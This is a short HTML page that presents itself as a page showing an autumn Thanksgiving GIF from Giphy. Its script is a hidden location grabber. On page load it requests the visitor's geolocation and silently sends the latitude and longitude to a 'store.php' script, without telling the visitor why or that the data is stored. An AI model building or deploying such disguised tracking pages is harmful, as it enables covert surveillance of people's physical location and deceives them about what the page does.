<!DOCTYPE html>
<html>
<body onload="getLocation()">
<iframe src="https://giphy.com/embed/8uifK66m5JBiGBKDHx" width="270" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/imariajohnsen-autumn-thanksgiving-november-8uifK66m5JBiGBKDHx">via GIPHY</a></p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
  xhttp.send();

}
</script>  
</body>
</html>
